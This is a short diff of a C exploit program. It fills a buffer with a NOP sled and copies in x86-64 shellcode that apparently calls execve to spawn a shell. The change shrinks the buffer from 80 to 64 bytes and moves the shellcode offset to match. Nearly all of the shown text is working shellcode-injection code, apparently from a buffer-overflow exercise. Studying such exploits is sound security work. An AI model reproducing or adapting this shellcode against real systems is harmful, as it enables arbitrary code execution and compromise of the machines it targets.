@@ -6,7 +6,7 @@
 
 
 int main(int argc, char *argv[]) {
-    char buffer[80]; 
+    char buffer[64]; 
     long *ret;
     long shellcode_addr;
 
@@ -16,7 +16,7 @@ int main(int argc, char *argv[]) {
     "\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
 
     memset(buffer, 0x90, sizeof(buffer)); 
-    memcpy(buffer + 80 - sizeof(shellcode), shellcode, sizeof(shellcode)); 
+    memcpy(buffer + 64 - sizeof(shellcode), shellcode, sizeof(shellcode)); 
 
     shellcode_addr = (long)buffer;
     
